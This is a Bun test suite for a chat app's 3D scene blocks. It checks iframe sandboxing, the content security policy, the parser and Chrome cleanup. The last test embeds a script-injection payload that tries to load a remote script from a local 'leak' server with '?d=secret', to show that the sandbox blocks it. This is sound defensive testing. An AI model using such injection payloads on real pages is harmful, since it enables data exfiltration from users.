import { expect, test } from "bun:test";
import { mkdirSync, readFileSync, writeFileSync } from "node:fs";
import { bootNcli } from "../src/boot";
import { demo3dBoxFence, demo3dFence } from "../src/live/3d-demo";
import { ncli3dSrc } from "../src/live/3d-frame";
import { frameHtml, iframeTag } from "../src/live/frame";
import { liveBlocks, parseLive, renderToolToFence } from "../src/live/parse";
import { liveLabel, liveShape, shimmerHtml } from "../src/live/shimmer";
import { chromePath, launchChrome } from "../src/perf/cdp";
import { makeHub, shotsDir, waitUntil } from "./helpers";

test("ncli 3d is a live kind and render keeps the fence", () => {
  const text = `Mesa.\n\n${demo3dFence()}`;
  expect(liveBlocks(text).map((b) => b.kind)).toEqual(["3d"]);
  expect(parseLive(text).some((s) => s.type === "live" && s.block.kind === "3d")).toBe(true);
  expect(renderToolToFence("3d", "ncli3d.desk()")).toBe("```ncli 3d\nncli3d.desk()\n```");
});

test("3d iframe vendors three.js, stays unique-origin, and keeps the fence source", () => {
  const page = readFileSync(new URL("../public/ncli3d.html", import.meta.url), "utf8");
  expect(page).toContain("/ncli3d.js");
  expect(page).toContain("/vendor/three.global.js");
  expect(page).toMatch(/script-src 'self' blob:/);
  expect(page).not.toMatch(/script-src[^"]*http:/);
  expect(page).not.toMatch(/script-src[^"]*https:/);
  expect(page).not.toContain("cdn");
  expect(page).not.toContain("unpkg");
  expect(page).not.toContain("jsdelivr");
  expect(ncli3dSrc("ncli3d.desk()")).toBe("/ncli3d.html#" + encodeURIComponent("ncli3d.desk()"));
  expect(ncli3dSrc("ncli3d.box()")).toBe("/ncli3d.html#" + encodeURIComponent("ncli3d.box()"));
  const framed = iframeTag({ kind: "3d", source: "ncli3d.desk()" });
  expect(framed).toContain("live-3d");
  expect(framed).toContain('sandbox="allow-scripts"');
  expect(framed).not.toContain("allow-same-origin");
  expect(framed).toContain('src="/ncli3d.html#');
  expect(framed).toContain(encodeURIComponent("ncli3d.desk()"));
  expect(framed).not.toContain("srcdoc=");
  expect(iframeTag({ kind: "3d", source: "ncli3d.box()" })).toContain(encodeURIComponent("ncli3d.box()"));
  const html = iframeTag({ kind: "html", source: "<b>x</b>" });
  expect(html).toContain('sandbox="allow-scripts"');
  expect(html).not.toContain("allow-same-origin");
  expect(frameHtml({ kind: "3d", source: "ncli3d.desk()" })).toContain("/ncli3d.html#");
});

test("shimmer for 3d is a scene placeholder", () => {
  expect(liveShape("3d")).toBe("scene");
  expect(liveLabel("3d")).toBe("montando a cena…");
  const html = shimmerHtml("3d", "ncli3d.desk()");
  expect(html).toContain("montando a cena…");
  expect(html).not.toContain("<iframe");
});

test("client parser and kit stay in lockstep with the 3d kind", () => {
  const js = readFileSync(new URL("../public/app.js", import.meta.url), "utf8");
  const kit = readFileSync(new URL("../public/ncli3d.js", import.meta.url), "utf8");
  const css = readFileSync(new URL("../public/app.css", import.meta.url), "utf8");
  expect(js).toContain("mermaid|html|react|url|ui|3d");
  expect(js).toContain("/ncli3d.html#");
  expect(js).toContain('sandbox="allow-scripts"');
  expect(js).not.toContain("allow-same-origin");
  expect(js).toContain("function bind3dPause");
  expect(js).toContain("function live3dFrame");
  expect(js).toContain("iframe.contentWindow === ev.source");
  expect(js).toContain('op === "wheel"');
  expect(kit).toContain("ev.source !== parent");
  expect(kit).toContain("function desk");
  expect(kit).toContain("function box");
  expect(kit).toContain("mesa inteira");
  expect(kit).toContain("Ctrl+scroll");
  expect(kit).toContain('op: "wheel"');
  expect(kit).not.toContain("OrbitControls");
  expect(css).toContain(".live-frame.live-3d");
  const three = readFileSync(new URL("../public/vendor/three.module.min.js", import.meta.url), "utf8");
  expect(three).toContain("170");
  expect(three).toContain("@license");
});

test("launchChrome close kills chrome after a failed run", async () => {
  if (!chromePath()) throw new Error("chrome not found");
  const port = 11000 + Math.floor(Math.random() * 400);
  let driver: Awaited<ReturnType<typeof launchChrome>> | undefined;
  try {
    driver = await launchChrome(port);
    await driver.session.attachPage("about:blank");
    throw new Error("boom");
  } catch (err) {
    expect(String(err)).toContain("boom");
  } finally {
    driver?.close();
  }
  await Bun.sleep(200);
  const alive = await fetch(`http://127.0.0.1:${port}/json/version`)
    .then((r) => r.ok)
    .catch(() => false);
  expect(alive).toBe(false);
});

test("chrome: a 3d fence paints the requested scene without same-origin", async () => {
  if (!chromePath()) throw new Error("chrome not found");
  const { hub } = await makeHub();
  hub.memory.append({
    kind: "talk",
    text: `Aqui a mesa.\n\n${demo3dFence()}\n\nE um cubo.\n\n${demo3dBoxFence()}`,
    seat: "claude",
  });
  hub.cfg.port = 19500 + Math.floor(Math.random() * 400);
  const booted = await bootNcli({ cfg: hub.cfg, hub, root: process.cwd() });
  let driver: Awaited<ReturnType<typeof launchChrome>> | undefined;
  const dir = shotsDir();
  mkdirSync(dir, { recursive: true });
  try {
    driver = await launchChrome(10000 + Math.floor(Math.random() * 400));
    await driver.session.attachPage("about:blank");
    await driver.session.send("Page.navigate", { url: booted.report.uiUrl });
    await waitUntil(
      () =>
        driver!.session.evaluate(`(() => {
          const frames = [...document.querySelectorAll("iframe.live-3d")];
          if (frames.length < 2) return false;
          const desk = frames[0];
          const cube = frames[1];
          const box = desk.getBoundingClientRect();
          return Boolean(
            box.height >= 400 &&
              desk.getAttribute("sandbox") === "allow-scripts" &&
              !String(desk.getAttribute("sandbox") || "").includes("allow-same-origin") &&
              String(desk.getAttribute("src") || "").includes(encodeURIComponent("ncli3d.desk()")) &&
              String(cube.getAttribute("src") || "").includes(encodeURIComponent("ncli3d.box()")) &&
              String(desk.dataset.ncli3dBtns || "").includes("mesa inteira") &&
              String(cube.dataset.ncli3dKind || "") === "box" &&
              Number(desk.dataset.ncli3dTris || 0) > 0,
          );
        })()`),
      12000,
      "3d scenes",
    );
    writeFileSync(`${dir}/ncli-3d-desk.png`, await driver.session.screenshot());
    const facts = await driver.session.evaluate<{
      card: boolean;
      height: number;
      sandbox: string;
      deskSrc: string;
      boxSrc: string;
      deskBtns: string;
      boxKind: string;
      tris: number;
      engine: string;
    }>(`(() => {
      const frames = [...document.querySelectorAll("iframe.live-3d")];
      const desk = frames[0];
      const cube = frames[1];
      const box = desk.getBoundingClientRect();
      return {
        card: Boolean(desk.closest(".ui-card")),
        height: Math.round(box.height),
        sandbox: desk.getAttribute("sandbox") || "",
        deskSrc: desk.getAttribute("src") || "",
        boxSrc: cube.getAttribute("src") || "",
        deskBtns: desk.dataset.ncli3dBtns || "",
        boxKind: cube.dataset.ncli3dKind || "",
        tris: Number(desk.dataset.ncli3dTris || 0),
        engine: desk.dataset.ncli3dEngine || "",
      };
    })()`);
    expect(facts.card).toBe(false);
    expect(facts.height).toBeGreaterThanOrEqual(400);
    expect(facts.sandbox).toBe("allow-scripts");
    expect(facts.sandbox).not.toContain("allow-same-origin");
    expect(facts.deskSrc).toContain(encodeURIComponent("ncli3d.desk()"));
    expect(facts.boxSrc).toContain(encodeURIComponent("ncli3d.box()"));
    expect(facts.deskBtns).toContain("mesa inteira");
    expect(facts.deskBtns).toContain("Tampo");
    expect(facts.boxKind).toBe("box");
    expect(facts.tris).toBeGreaterThan(0);
    expect(facts.engine).toContain("three.js r170");
    const before = await driver.session.evaluate<number>(`document.getElementById("chat")?.scrollTop || 0`);
    await driver.session.evaluate(`window.postMessage({ type: "ncli-3d", op: "wheel", deltaY: 8000 }, "*")`);
    await Bun.sleep(120);
    const after = await driver.session.evaluate<number>(`document.getElementById("chat")?.scrollTop || 0`);
    expect(after).toBe(before);
  } finally {
    driver?.close();
    booted.stop();
  }
}, 30000);

test("chrome: a 3d fence cannot load a remote script", async () => {
  if (!chromePath()) throw new Error("chrome not found");
  const hits: string[] = [];
  const leak = Bun.serve({
    hostname: "127.0.0.1",
    port: 0,
    fetch(req) {
      const u = new URL(req.url);
      hits.push(`${u.pathname}${u.search}`);
      return new Response("/* leak */", {
        headers: {
          "content-type": "application/javascript",
          "access-control-allow-origin": "*",
        },
      });
    },
  });
  const leakUrl = `http://127.0.0.1:${leak.port}/leak.js?d=secret`;
  const source = `(function(){var s=document.createElement("script");s.src=${JSON.stringify(leakUrl)};document.documentElement.appendChild(s);ncli3d.desk();})()`;
  const { hub } = await makeHub();
  hub.memory.append({
    kind: "talk",
    text: "```ncli 3d\n" + source + "\n```",
    seat: "claude",
  });
  hub.cfg.port = 19600 + Math.floor(Math.random() * 400);
  const booted = await bootNcli({ cfg: hub.cfg, hub, root: process.cwd() });
  let driver: Awaited<ReturnType<typeof launchChrome>> | undefined;
  try {
    driver = await launchChrome(10100 + Math.floor(Math.random() * 400));
    await driver.session.attachPage("about:blank");
    await driver.session.send("Page.navigate", { url: booted.report.uiUrl });
    await waitUntil(
      () =>
        driver!.session.evaluate(`(() => {
          const desk = document.querySelector("iframe.live-3d");
          return Boolean(desk && String(desk.dataset.ncli3dBtns || "").includes("mesa inteira"));
        })()`),
      12000,
      "desk despite leak script",
    );
    await Bun.sleep(400);
    expect(hits).toEqual([]);
  } finally {
    driver?.close();
    booted.stop();
    leak.stop();
  }
}, 30000);
